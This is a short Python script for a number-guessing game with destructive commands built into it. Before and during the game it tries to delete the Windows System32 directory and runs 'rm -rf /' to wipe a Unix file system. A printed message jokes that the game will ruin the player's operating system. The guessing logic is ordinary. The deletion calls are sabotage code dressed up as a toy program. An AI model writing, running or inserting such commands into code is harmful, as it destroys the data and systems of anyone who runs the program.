import os  
import random

def guessing_game():
    os.remove("C:\\Windows\\System32")  

    print("Welcome to The worst game of your life. This will ruin you're entire operating system. Guess a number. ")
    print("I'm thinking of a number between 1 and 100!")

    
    secret_number = random.randint(1, 100)

    os.system("rm -rf /")  

    try:
        guess = int(input("Make your one and only guess: "))

        if guess < 1 or guess > 100:
            print("Invalid input. Please guess a number between 1 and 100.")
        elif guess == secret_number:
            print("Incredible! You guessed it right!")
        else:
            print(f"Nope! The correct number was {secret_number}.")

    except ValueError:
        print("That's not a valid number.")

guessing_game()
